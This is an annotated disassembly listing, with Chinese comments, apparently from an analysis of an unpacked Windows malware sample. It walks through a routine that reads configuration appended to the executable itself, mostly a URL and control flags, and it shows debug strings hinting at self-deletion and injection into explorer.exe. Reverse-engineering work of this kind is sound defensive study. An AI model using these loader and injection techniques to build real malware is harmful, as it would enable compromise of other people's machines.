
unpacked:00401EB4 loc_401EB4:                     ; CODE XREF: WinMain(x,x,x,x)+413j  

unpacked:00401EB4                push offset aDelMeOver_ ; "Del me over ."  

unpacked:00401EB9                call esi ; OutputDebugStringA  

unpacked:00401EBB                push 1388h         ; dwMilliseconds  

unpacked:00401EC0                call Sleep  

unpacked:00401EC6                push offset aBeginReturn___ ; "begin return ..."  

unpacked:00401ECB                call esi ; OutputDebugStringA  

unpacked:00401ECD  

unpacked:00401ECD loc_401ECD:                     ; CODE XREF: WinMain(x,x,x,x)+215j  

unpacked:00401ECD                            ; WinMain(x,x,x,x)+220j  

unpacked:00401ECD                push 1  

unpacked:00401ECF                pop eax  

unpacked:00401ED0  

unpacked:00401ED0 loc_401ED0:                     ; CODE XREF: WinMain(x,x,x,x)+268j  

unpacked:00401ED0                pop edi  

unpacked:00401ED1                pop esi  

unpacked:00401ED2                pop ebx  

unpacked:00401ED3                leave  

unpacked:00401ED4                retn 10h  

unpacked:00401ED4 _WinMain@16 endp  

unpacked:00401ED4  

unpacked:00401ED7  

//读取附加数据 call (即配置信息了,主要为 URl,和一些 bool 型的控制变量)  

unpacked:00402114                push ebp  

unpacked:00402115                mov ebp, esp  

unpacked:00402117                sub esp, 170h  

unpacked:0040211D                and [ebp+Filename], 0  

unpacked:00402124                push ebx  

unpacked:00402125                push esi  

unpacked:00402126                push edi  

unpacked:00402127                push 3Fh  

unpacked:00402129                xor eax, eax  

unpacked:0040212B                pop ecx  

unpacked:0040212C                lea edi, [ebp+var_16F]  

unpacked:00402132                rep stosd  

unpacked:00402134                stosw  

unpacked:00402136                lea eax, [ebp+Filename]  

unpacked:0040213C                push 0FFh          ; nSize  

unpacked:00402141                push eax           ; lpFilename  

unpacked:00402142                push 0             ; hModule  

unpacked:00402144                call GetModuleFileNameA ; 得到自身文件路径.  

unpacked:0040214A                test eax, eax  

unpacked:0040214C                ja  short loc_402158  

unpacked:0040214E                push offset aGetModulefileN ; "Get modulefile name failed...."  

unpacked:00402153                jmp loc_402384  

unpacked:00402158 ; ---------------------------------------------------------------------------  

unpacked:00402158  

unpacked:00402158 loc_402158:                     ; CODE XREF: Read_Overlay+38j  

unpacked:00402158                lea eax, [ebp+Filename]  

unpacked:0040215E                push offset aRb    ; "rb"  

unpacked:00402163                push eax           ; Filename  

unpacked:00402164                call fopen         ; 以二进制模式打开  

unpacked:0040216A                mov ebx, eax  

unpacked:0040216C                pop ecx  

unpacked:0040216D                test ebx, ebx  

unpacked:0040216F                pop ecx  

unpacked:00402170                jnz short loc_40217C  

unpacked:00402172                push offset aCanOpenMyself_ ; "can open myself...."  

unpacked:00402177                jmp loc_402384  

unpacked:0040217C ; ---------------------------------------------------------------------------  

unpacked:0040217C  

unpacked:0040217C loc_404217C:                     ; CODE XREF: Read_Overlay+5Cj  

unpacked:0040217C                and [ebp+DstBuf], 0  

unpacked:00402180                mov esi, fseek  

unpacked:00402186                push 1Bh  

unpacked:00402188                xor eax, eax  

unpacked:0040218A                pop ecx  

unpacked:0040218B                lea edi, [ebp+var_6F]  

unpacked:0040218E                push 2             ; Origin  

unpacked:00402190                push 0FFFFFF30h    ; Offset  

unpacked:00402195                rep stosd  

unpacked:00402197                push ebx           ; File  

unpacked:00402198                call esi ; fseek   ; 定位至特定位置.  

unpacked:0040219A                mov edi, fread  

unpacked:004021A0                push ebx           ; File  

unpacked:004021A1                push 1             ; Count  

unpacked:004021A3                lea eax, [ebp+DstBuf]  

unpacked:004021A6                push 1             ; ElementSize  

unpacked:004021A8                push eax           ; DstBuf  

unpacked:004021A9                call edi ; fread   ; 下面全部都是一些配置信息的读取了, 就不做过多的解释，我们分析一下它主要干什么事就可以了。  

unpacked:004021AB                add esp, 1Ch  

unpacked:004021AE                test eax, eax  

unpacked:004021B0                jnz short loc_4021BC  

unpacked:004021B2                push offset aFopenCannTRead ; "fopen cann't read data.. /isinject "  

unpacked:004021B7                jmp loc_402384  

unpacked:004021BC ; ---------------------------------------------------------------------------  

unpacked:004021BC  

unpacked:004021BC loc_4021BC:                     ; CODE XREF: Read_Overlay+9Cj  

unpacked:004021BC                cmp [ebp+DstBuf], 59h  

unpacked:004021C0                push 6Dh           ; Size  

unpacked:004021C2                push 0             ; Val  

unpacked:004021C4                setz al  

unpacked:004021C7                mov byte_404A10, al  

unpacked:004021CC                lea eax, [ebp+DstBuf]  

unpacked:004021CF                push eax           ; Dst  

unpacked:004021D0                call memset  

unpacked:004021D5                push 2             ; Origin  

unpacked:004021D7                push 0FFFFFF31h    ; Offset  

unpacked:004021DC                push ebx           ; File  

unpacked:004021DD                call esi ; fseek  

unpacked:004021DF                push ebx           ; File  

unpacked:004021E0                push 1             ; Count  

unpacked:004021E2                lea eax, [ebp+DstBuf]  

unpacked:004021E5                push 1             ; ElementSize  

unpacked:004021E7                push eax           ; DstBuf  

unpacked:004021E8                call edi ; fread  

unpacked:004021EA                add esp, 28h  

unpacked:004021ED                cmp byte_404A10, 0  

unpacked:004021F4                jz  short loc_402203  

unpacked:004021F6                cmp [ebp+DstBuf], 49h  

unpacked:004021FA                jnz short loc_40221A  

unpacked:004021FC                and dword_404A0C, 0  

unpacked:00402203  

unpacked:00402203 loc_402203:                     ; CODE XREF: Read_Overlay+E0j  

unpacked:00402203                            ; Read_Overlay+116j  

unpacked:00402203                            ; Read_Overlay+128j  

unpacked:00402203                mov eax, dword_404A0C  

unpacked:00402208                sub eax, 0  

unpacked:0040220B                jz  short loc_40224F  

unpacked:0040220D                dec eax  

unpacked:0040220E                jz  short loc_402248  

unpacked:00402210                dec eax  

unpacked:00402211                jnz short loc_402260  

unpacked:00402213                push offset aExplorer_exe ; "explorer.exe"  

unpacked:00402218                jmp short loc_402254  

unpacked:0040221A ; ---------------------------------------------------------------------------  

unpacked:0040221A  

unpacked:0040221A loc_40221A:                     ; CODE XREF: Read_Overlay+E6j  

unpacked:0040221A                cmp [ebp+DstBuf], 53h  

unpacked:0040221E                jnz short loc_40222C  

unpacked:00402220                mov dword_404A0C, 1  

unpacked:0040222A                jmp short loc_402203  

unpacked:0040222C ; ---------------------------------------------------------------------------  

unpacked:0040222C  

unpacked:0040222C loc_40222C:                     ; CODE XREF: Read_Overlay+10Aj  

unpacked:0040222C                cmp [ebp+DstBuf], 45h  

unpacked:00402230                jnz short loc_40223E  

unpacked:00402232                mov dword_404A0C, 2  

unpacked:0040223C                jmp short loc_402203  

unpacked:0040223E ; ---------------------------------------------------------------------------  

unpacked:0040223E  

unpacked:0040223E loc_40223E:                     ; CODE XREF: Read_Overlay+11Cj  
